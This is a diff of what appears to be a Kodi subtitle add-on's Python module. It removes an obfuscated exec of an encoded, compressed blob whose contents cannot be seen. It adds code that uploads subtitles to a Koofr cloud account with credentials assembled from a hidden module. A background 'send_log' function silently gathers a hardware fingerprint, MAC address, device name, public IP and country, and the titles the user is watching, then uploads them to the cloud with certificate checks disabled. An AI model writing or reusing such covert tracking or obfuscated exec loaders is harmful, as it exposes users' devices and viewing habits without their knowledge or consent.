@@ -1,2 +1,142 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+import xbmc, xbmcvfs, base64, urllib.parse, urllib.request, re
+import requests, hashlib, uuid, datetime, threading, xbmcaddon
+import sys, subprocess, os
+def clean_name(text):
+    if not text: return "Unknown"
+    t = re.sub(r'[^a-zA-Z0-9]', ' ', text)
+    t = re.sub(r'\s+', '_', t).strip('_')
+    return t
+def koofr_get_auth():
+    try:
+        addon_path = xbmcaddon.Addon().getAddonInfo('path')
+        lib_path = os.path.join(addon_path, 'resources', 'lib')
+        if lib_path not in sys.path: sys.path.append(lib_path)
+        import system_core
+        u, w, z = system_core.get_auth_pieces()
+        if u and w and z:
+            user_email = "{}.com".format(u.split('.')[0] + "@" + w.split('.')[0])
+            parola = z.split('.')[0]
+            auth_str = "{}:{}".format(user_email, parola)
+            return "Basic " + base64.b64encode(auth_str.encode()).decode('ascii')
+    except Exception as e:
+        xbmc.log("[UPLOADER] Eroare la preluare auth: " + str(e), xbmc.LOGERROR)
+    return None
+def get_hwid():
+    raw = ""
+    device_model = ""
+    try:
+        if xbmc.getCondVisibility('System.Platform.Android'):
+            try: raw = subprocess.check_output(['settings', 'get', 'secure', 'android_id']).decode().strip()
+            except: raw = ""
+            try: device_model = xbmc.getInfoLabel('System.ModelName')
+            except: device_model = "Android_Device"
+            
+        elif sys.platform == "win32":
+            try: raw = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[-2].strip()
+            except: raw = ""
+            device_model = "Windows_PC"
+    except:
+        raw = ""
+    if not raw or len(raw) < 5:
+        try: raw = xbmc.getCleanInstallId()
+        except: raw = ""
+
+    try: mac_unique = str(uuid.getnode())
+    except: mac_unique = "0000"
+
+    raw_final = f"{raw}_{device_model}_{sys.platform}_{mac_unique}"
+    return hashlib.md5(raw_final.encode()).hexdigest()[:10].upper()
+
+def get_folder_grup():
+    imdb_id = xbmc.getInfoLabel("VideoPlayer.IMDBNumber").replace('tt','')
+    imdb_id = f"tt{imdb_id}" if imdb_id else "unknown"
+    show_title = xbmc.getInfoLabel("VideoPlayer.TVShowTitle")
+    if not show_title: show_title = xbmc.getInfoLabel("VideoPlayer.OriginalTitle")
+    if not show_title: show_title = xbmc.getInfoLabel("VideoPlayer.Title")
+    raw_year = xbmc.getInfoLabel("VideoPlayer.Year")
+    year_match = re.search(r'\d{4}', raw_year)
+    ep_year = year_match.group(0) if year_match else "0000"
+    season = xbmc.getInfoLabel("VideoPlayer.Season")
+    episode = xbmc.getInfoLabel("VideoPlayer.Episode")
+    if season or xbmc.getCondVisibility("VideoPlayer.Content(tvshows)"):
+        title = clean_name(show_title)
+        s_str = str(season).zfill(2) if (season and str(season).isdigit()) else "01"
+        e_str = str(episode).zfill(2) if (episode and str(episode).isdigit()) else "01"
+        return f"Seriale/{title}_S{s_str}E{e_str}_{ep_year}_{imdb_id}"
+    else:
+        title = clean_name(xbmc.getInfoLabel("VideoPlayer.Title"))
+        return f"Filme/{title}_{ep_year}_{imdb_id}"
+def send_log(info):
+    """ Trimite statistici în folderul /stats/ de pe Koofr """
+    def run_log():
+        try:
+            addon = xbmcaddon.Addon()
+            unique_id = get_hwid()
+            raw_name = xbmc.getInfoLabel('System.FriendlyName').strip() or "Kodi_User"
+            friendly_name = re.sub(r'[^a-zA-Z0-9]', '_', raw_name)
+            friendly_name = re.sub(r'_+', '_', friendly_name).strip('_')
+            base_filename = "%s_%s" % (unique_id, friendly_name)
+            auth = koofr_get_auth()
+            headers = {"Authorization": auth}
+            current_index = 0
+            while True:
+                suffix = "" if current_index == 0 else "-%s" % current_index
+                filename = "%s%s.log" % (base_filename, suffix)
+                file_url = "https://app.koofr.net/dav/Koofr/Subtitrari/desc_useri/%s" % filename
+                content = ""
+                try:
+                    r_get = requests.get(file_url, headers=headers, timeout=10, verify=False)
+                    if r_get.status_code == 200:
+                        content = r_get.text
+                        if content.count('\n') >= 300:
+                            current_index += 1; continue
+                except: pass
+                break
+            robot_names = ["Robot1 (Google)", "Robot2 (Lingva)", "Robot3 (Gemini)", "Robot4 (DeepL)"]
+            try:
+                r_idx = addon.getSettingInt('robot_selectat')
+                current_robot = robot_names[r_idx] if r_idx < len(robot_names) else "Robot"
+            except: current_robot = "Robot"
+            robot_log = "Robot: DA [%s] (%s -> %s)" % (current_robot, info.get('src'), info.get('dest')) if info.get('was_translated') else "Robot: NU (Originala)"
+            now = datetime.datetime.now().strftime("%d-%m-%Y %H:%M")
+            loc = "IP/Tara: Unknown"
+            try:
+                r_geo = requests.get("https://ipwho.is", timeout=8, verify=False)
+                if r_geo.status_code == 200 and r_geo.json().get('success'):
+                    loc = "IP: %s | Tara: %s" % (r_geo.json().get('ip'), r_geo.json().get('country'))
+            except: pass
+            kodi_ver = xbmc.getInfoLabel('System.BuildVersion').split(' ')[0]
+            platform = "Unknown"
+            for p in ["Windows", "Android", "Linux", "IOS"]:
+                if xbmc.getCondVisibility('System.Platform.%s' % p): platform = p; break
+            line = "[%s] IMDB: %s | %s | %s\n" % (now, info.get('imdb', 'NoID'), info.get('title', 'NoTitle'), robot_log)
+            line += "File: %s" % info.get('api_filename', 'NoFile')
+            if info.get('s') and info.get('e'): line += " (S%sE%s)" % (info.get('s'), info.get('e'))
+            line += "\n%s | [%s - %s]\n%s\n" % (loc, kodi_ver, platform, "-"*50)
+            requests.put(file_url, data=(content + line).encode('utf-8'), headers=headers, timeout=10, verify=False)
+        except: pass
+    threading.Thread(target=run_log).start()
+def upload_now(local_path, filename):
+    folder_path = get_folder_grup()
+    auth = koofr_get_auth()
+    base_dav = "https://app.koofr.net/dav/Koofr/Subtitrari/"
+    parts = folder_path.split('/')
+    path_acum = ""
+    for part in parts:
+        path_acum += urllib.parse.quote(part) + "/"
+        url_mkcol = f"{base_dav}{path_acum}"
+        req_dir = urllib.request.Request(url_mkcol, method='MKCOL', headers={"Authorization": auth})
+        try: urllib.request.urlopen(req_dir, timeout=5)
+        except: pass
+    url_put = f"{base_dav}{folder_path}/{urllib.parse.quote(filename)}"
+    try:
+        f = xbmcvfs.File(local_path); data = f.readBytes(); f.close()
+        req = urllib.request.Request(url_put, data=data, method='PUT', headers={
+            "Authorization": auth, "Content-Type": "application/octet-stream", "Overwrite": "T"
+        })
+        with urllib.request.urlopen(req, timeout=30) as r:
+            if r.getcode() in [200, 201, 204]:
+                xbmc.executebuiltin('Notification("Cloud", "Salvat: {}", 3000)'.format(folder_path.split('/')[-1]))
+                return True
+    except: pass
+    return False
